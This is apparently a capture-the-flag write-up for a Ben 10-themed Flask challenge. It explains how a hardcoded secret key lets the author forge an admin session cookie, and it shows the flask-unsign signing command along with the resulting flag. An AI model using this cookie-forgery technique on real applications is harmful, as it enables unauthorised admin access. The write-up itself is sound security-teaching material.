This is a simple website where we can create a user and use it to view different ben 10 creatures, and our goal is to be able to become 'admin' user and view one of the alien creatures.
Initially, it looks like sqli or bypassing filters to set username to begin with 'admin'.
```py

@app.route('/image/<image_id>')
def image(image_id):
    """Display the image if user is admin or redirect with missing permissions."""
    if 'username' not in session:
        return redirect(url_for('login'))

    username = session['username']

    if image_id == 'ben10' and not username.startswith('admin'):
        return redirect(url_for('missing_permissions'))

    flag = None
    if username.startswith('admin') and image_id == 'ben10':
        flag = FLAG

    return render_template('image_viewer.html', image_name=image_id, flag=flag)

```

However, in above code, we can see that the username and password is fetched directly from session variables, which are stored as jwt.
Now if we can get the jwt secret key, we can manipulate the jwt. In order to obtain the secret key, a tool, <a href=https://github.com/Paradoxis/Flask-Unsign>flask-unsign</a> is used.
We found out that the secret key is `'your_secret_key'` the way it is in the source code itself. 
Hence, again using flask-unsign, the body of the jwt is changed to `"{'username':'admin'}"`.
`flask-unsign --sign --cookie "{'username': 'admin'}" --secret 'your_secret_key'`
Then we can click on the alien that gives the flag - 
`srdnlen{b3n_l0v3s_br0k3n_4cc355_c0ntr0l_vulns}`
